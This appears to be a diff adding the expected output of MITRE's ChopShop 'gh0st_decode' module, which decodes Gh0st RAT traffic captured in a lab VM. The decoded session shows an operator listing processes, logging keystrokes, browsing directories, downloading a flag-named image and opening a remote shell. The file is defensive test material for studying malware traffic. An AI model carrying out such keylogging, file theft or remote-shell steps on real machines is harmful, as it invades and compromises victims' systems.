@@ -1,0 +1,192 @@
+Warning Legacy Module gh0st_decode!
+Starting ChopShop (Created by MITRE)
+Initializing Modules ...
+	Initializing module 'gh0st_decode'
+Running Modules ...
+TOKEN: PSLIST
+PID	EXE		PROC NAME
+568	smss.exe		\SystemRoot\System32\smss.exe
+632	csrss.exe		\??\C:\WINDOWS\system32\csrss.exe
+656	winlogon.exe		\??\C:\WINDOWS\system32\winlogon.exe
+700	services.exe		C:\WINDOWS\system32\services.exe
+712	lsass.exe		C:\WINDOWS\system32\lsass.exe
+864	vmacthlp.exe		C:\Program Files\VMware\VMware Tools\vmacthlp.exe
+876	svchost.exe		C:\WINDOWS\system32\svchost.exe
+964	svchost.exe		C:\WINDOWS\system32\svchost.exe
+1048	svchost.exe		C:\WINDOWS\System32\svchost.exe
+1092	svchost.exe		C:\WINDOWS\system32\svchost.exe
+1176	svchost.exe		C:\WINDOWS\system32\svchost.exe
+1480	spoolsv.exe		C:\WINDOWS\system32\spoolsv.exe
+1676	explorer.exe		C:\WINDOWS\Explorer.EXE
+1752	vmtoolsd.exe		C:\Program Files\VMware\VMware Tools\vmtoolsd.exe
+1776	GrooveMonitor.exe		C:\Program Files\Microsoft Office\Office12\GrooveMonitor.exe
+1784	ctfmon.exe		C:\WINDOWS\system32\ctfmon.exe
+1948	locator.exe		C:\WINDOWS\system32\locator.exe
+1996	vmtoolsd.exe		C:\Program Files\VMware\VMware Tools\vmtoolsd.exe
+512	TPAutoConnSvc.exe		C:\Program Files\VMware\VMware Tools\TPAutoConnSvc.exe
+1384	wscntfy.exe		C:\WINDOWS\system32\wscntfy.exe
+1556	alg.exe		C:\WINDOWS\System32\alg.exe
+1324	TPAutoConnect.exe		C:\Program Files\VMware\VMware Tools\TPAutoConnect.exe
+1656	Wireshark.exe		C:\Program Files\Wireshark\Wireshark.exe
+1600	cmd.exe		C:\WINDOWS\system32\cmd.exe
+1928	wuauclt.exe		C:\WINDOWS\system32\wuauclt.exe
+1988	WinSCP.exe		C:\Documents and Settings\Administrator\Desktop\WinSCP-5.9.5-Portable\WinSCP.exe
+468	WinSCP.exe		C:\Documents and Settings\Administrator\Desktop\WinSCP-5.9.5-Portable\WinSCP.exe
+2584	dumpcap.exe		C:\Program Files\Wireshark\dumpcap.exe
+COMMAND: WSLIST
+TOKEN: WSLIST
+PID	TITLE
+1656	Capturing from Local Area Connection 2    [Wireshark 1.10.0  (SVN Rev 49790 from /trunk-1.10)]
+468	remnux - remnux@192.168.155.129 - WinSCP
+1600	Command Prompt
+1676	transfer
+1988	My Documents - remnux@192.168.155.129 - WinSCP
+1676	Program Manager
+COMMAND: DIALUPASS
+TOKEN: DIALUPASS
+TOKEN: KEYBOARD START (OFFLINE)
+COMMAND: NEXT
+TOKEN: KEYBOARD DATA
+
+[05/30/2017 19:40:39] (Untitled - Notepad)
+h
+TOKEN: KEYBOARD DATA
+el
+TOKEN: KEYBOARD DATA
+l
+TOKEN: KEYBOARD DATA
+o
+TOKEN: KEYBOARD DATA
+ 
+TOKEN: KEYBOARD DATA
+th
+TOKEN: KEYBOARD DATA
+is
+TOKEN: KEYBOARD DATA
+ i
+TOKEN: KEYBOARD DATA
+s 
+TOKEN: KEYBOARD DATA
+do
+TOKEN: KEYBOARD DATA
+g
+TOKEN: KEYBOARD DATA
+.
+TOKEN: KEYBOARD DATA
+..
+TOKEN: KEYBOARD DATA
+i
+TOKEN: KEYBOARD DATA
+s 
+TOKEN: KEYBOARD DATA
+an
+TOKEN: KEYBOARD DATA
+y
+TOKEN: KEYBOARD DATA
+b
+TOKEN: KEYBOARD DATA
+o
+TOKEN: KEYBOARD DATA
+dy 
+TOKEN: KEYBOARD DATA
+li
+TOKEN: KEYBOARD DATA
+s
+TOKEN: KEYBOARD DATA
+te
+TOKEN: KEYBOARD DATA
+n
+TOKEN: KEYBOARD DATA
+in
+TOKEN: KEYBOARD DATA
+g
+TOKEN: KEYBOARD DATA
+?
+TOKEN: DRIVE LIST
+DRIVE	TOTAL	FREE	FILESYSTEM	DESCRIPTION
+A	0	0		Removable Disk
+C	20465	16190	NTFS	Local Disk
+D	2810	0	UDF	CD Drive
+COMMAND: LIST FILES (C:\)
+TOKEN: FILE LIST
+TYPE	NAME	SIZE	WRITE TIME
+FILE	AUTOEXEC.BAT	0	131310402544996250
+FILE	boot.ini	211	131310400724371250
+FILE	CONFIG.SYS	0	131310402544996250
+FILE	Documents and Settings	0	131405771391875000
+FILE	IO.SYS	0	131310402544996250
+FILE	MSDOS.SYS	0	131310402544996250
+FILE	MSOCache	0	131321802034218750
+FILE	NTDETECT.COM	47564	127856016000000000
+FILE	ntldr	250032	127856016000000000
+DIR	pagefile.sys	805306368	131405761809843750
+DIR	Program Files	0	131405759978430000
+DIR	Python27	0	131321767200000000
+DIR	RECYCLER	0	131321805331875000
+DIR	System Volume Information	0	131310404272343750
+DIR	WINDOWS	0	131321802590312500
+COMMAND: LIST FILES (C:\Documents and Settings\)
+TOKEN: FILE LIST
+TYPE	NAME	SIZE	WRITE TIME
+FILE	Administrator	0	131310404347500000
+FILE	All Users	0	131310401926558750
+FILE	Default User	0	131310402636558750
+FILE	LocalService	0	131310404244687500
+FILE	NetworkService	0	131310404209843750
+COMMAND: LIST FILES (C:\Documents and Settings\Administrator\)
+TOKEN: FILE LIST
+TYPE	NAME	SIZE	WRITE TIME
+FILE	Application Data	0	131405773544687500
+FILE	Cookies	0	131310402635152500
+FILE	Desktop	0	131405778490156250
+FILE	Favorites	0	131310404844062500
+FILE	Local Settings	0	131310219157812500
+FILE	My Documents	0	131406612004375000
+FILE	NetHood	0	131310219157656250
+FILE	NTUSER.DAT	786432	131405761499211250
+FILE	ntuser.dat.LOG	1024	131406612434843750
+FILE	ntuser.ini	178	131405761499836250
+DIR	PrintHood	0	131310219157656250
+DIR	Recent	0	131405771576718750
+DIR	SendTo	0	131310404408906250
+DIR	Start Menu	0	131310219157812500
+DIR	Templates	0	131310401006871250
+COMMAND: LIST FILES (C:\Documents and Settings\Administrator\My Documents\)
+TOKEN: FILE LIST
+TYPE	NAME	SIZE	WRITE TIME
+FILE	desktop.ini	84	131310404844218750
+FILE	MCA{GHOSTY}.jpg	31430	131405771051271063
+FILE	My Music	0	131310404844375000
+FILE	My Pictures	0	131310404844218750
+COMMAND: DOWN FILES (C:\Documents and Settings\Administrator\My Documents\MCA{GHOSTY}.jpg)
+TOKEN: FILE SIZE (C:\Documents and Settings\Administrator\My Documents\MCA{GHOSTY}.jpg: 31430)
+COMMAND: CONTINUE
+TOKEN: FILE DATA (8183)
+COMMAND: CONTINUE
+TOKEN: FILE DATA (8183)
+COMMAND: CONTINUE
+TOKEN: FILE DATA (8183)
+COMMAND: CONTINUE
+TOKEN: FILE DATA (6881)
+COMMAND: CONTINUE
+TOKEN: TRANSFER FINISH
+TOKEN: SHELL START
+
+
+
+Microsoft Windows XP [Version 5.1.2600]
+(C) Copyright 1985-2001 Microsoft Corp.
+
+C:\WINDOWS\system32>
+
+echo "owned"
+
+
+echo "owned"
+"owned"
+
+C:\WINDOWS\system32>
+Shutting Down Modules ...
+	Shutting Down gh0st_decode
+Module Shutdown Complete ...
+ChopShop Complete
